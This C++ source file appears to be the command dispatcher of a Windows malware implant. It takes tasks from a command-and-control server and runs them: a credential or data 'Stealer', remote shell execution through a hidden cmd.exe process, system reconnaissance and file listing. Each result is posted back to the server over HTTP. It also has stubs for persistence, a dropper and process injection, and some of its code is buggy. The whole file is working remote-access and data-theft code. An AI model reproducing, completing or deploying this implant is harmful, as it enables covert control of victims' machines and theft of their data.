#include "execute.h"

/* Directory of Commands
- Persistence_1
- SituationalAwareness
- Stealer
- Execution <arg>
- File Enumeration <arg> - List files in the directory

TODO:
- Retrieval - Is commented out?
- Injection - Will work on it next time
 */
void execute(std::string command, std::string args, int task_id, int implant_id){

    std::string results;

    /* Persistance */
    // before publishing - the bat file needs to load the implant.exe
    // only uncomment in sandbox
    if(command.compare("Persistence_1") == 0){
        printf("Executing Persistence\n");
        results = "executed";
        // persist_execution();
        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
    }

    /* Situational Awareness */
    if(command.compare("SituationalAwareness") == 0){
        printf("Executing Situational Awareness\n");
        json results_parse = GetAll();
       // results = results_parse.at(0).at(2);
        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
    }

    /* Execution */
    if(command.compare("Execution") == 0){
        printf("Executing Execution\n");

        // //split on space
        // int i = args.find(" ");
        // char * prog = (char *) malloc(i);
        // for (int j =0; j < i; j++){
        //     prog[j] = args[j];
        // }
        // char * a = (char *) malloc(args.size() - i);
        // for (int k = i; k < args.size(); k++){
        //     a[k] = args[k];
        // }
        char* c = strcpy(new char[args.length() + 1], args.c_str());
        std::string duh = "C:/Windows/System32/cmd.exe /c";
        char* k = strcpy(new char[duh.length() + 1], duh.c_str());
        std::string res = exec(k,c);
            

        results = res;
        results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
        results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
        std::replace( results.begin(), results.end(), '\\', '/');
        std::replace( results.begin(), results.end(), '-', '_');
        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
        //std::cout << res << std::endl;
        //std::cout << HttpResponse("/response_json", implant_id, task_id, results, "success", command) << std::endl;
    }
    
    /* File Enumeration */
    if(command.compare("File_Enumeration") == 0){
        printf("Executing File Enumeration\n");
            //std::string s = std::string("C:\\Windows\\System32");
        std::string path = args;
        std::vector<std::string> file_names (getFileNamesFromPath(path));

        std::stringstream storage;
        for (auto iterator = file_names.begin(); iterator != file_names.end(); iterator++){
            if (iterator != file_names.begin()){
                storage << " ";
            }
            storage << *iterator;
        }
            //std::string s = std::accumulate(ss.begin(), ss.end(), std::string(""));
        std::string result = storage.str();
            //std::cout << result << std::endl;
            //std::string item = 
        std::cout << HttpResponse("/response_json", implant_id, task_id, result, "success", command) << std::endl;
            //std::cout << item;
    }

    /* Retrieval */
    // doesn't work?
    if(command.compare("Retrieval") ==0 ){
        printf("Executing Retrieval\n");
        //Where we add in SendToC2
    }

    /* Stealer Function */
    if(command.compare("Stealer") == 0){
        json data_from_driver;
        printf("Executing Stealer\n");
        data_from_driver = driver();
        results = data_from_driver.dump();

        /* Send the response back to the server */
        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
    }

    /* Dropper */
    if(command.compare("Dropper") == 0){
        printf("Executing Dropper\n");
        //Dropper();
    }

    /* Injection */
    //hasn't been implemented
    if(command.compare("Injection") == 0){
        printf("Executing Injection\n");

    }
    return;
}





std::string exec(char* program, char* args){
  
   LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
    + 50);
    sprintf(cmd, "cmd.exe /c %s", args);
    HANDLE hStdOutRead, hStdOutWrite;

    hStdOutRead = GetStdHandle(STD_OUTPUT_HANDLE); 
    if ((hStdOutRead == INVALID_HANDLE_VALUE) || (hStdOutWrite == INVALID_HANDLE_VALUE))
        return FALSE;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        printf("error creating pipe");
        return FALSE;
    }
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdInput = NULL;
    si.hStdError = hStdOutWrite;
    si.hStdOutput = hStdOutWrite;
    BOOL creationResult = CreateProcessA(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
    std::string output;
    if (creationResult){
        LPVOID buffer[4096];
        DWORD bytesAvail = 0, bytesRead = 0;
        do {
            do {
            ZeroMemory(buffer, 4096);
            if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvail, NULL)) {
                printf("error peeking at pipe");
                return "";
            }

            if (bytesAvail) {
                if (!ReadFile(hStdOutRead, buffer, 4095, &bytesRead, NULL)) {
                    printf("error reading pipe");
                    return "";
                }
                if (bytesRead) {
                     char *charData = (char*)buffer;
                    output = std::string(charData);
                    
                    //printf("%s", buffer);
                }
            }
        } while (bytesAvail != 0);
    } while (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
    }
    
    return output;
}
